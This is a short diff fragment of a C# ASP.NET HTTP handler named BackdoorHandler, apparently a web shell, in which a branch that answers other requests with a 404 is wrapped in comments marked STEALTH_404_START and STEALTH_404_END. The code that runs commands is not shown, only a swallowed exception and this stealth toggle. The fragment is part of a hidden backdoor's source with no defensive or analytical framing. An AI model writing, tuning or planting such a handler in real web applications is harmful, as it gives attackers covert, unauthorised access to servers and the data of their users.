@@ -38,8 +38,10 @@ public class BackdoorHandler : IHttpHandler, IRequiresSessionState {
                 }
             } catch (Exception ex) {}
         } else {
+            /* [STEALTH_404_START]
             response.StatusCode = 404;
         	response.End();
+            [STEALTH_404_END] */
         }
     }
 
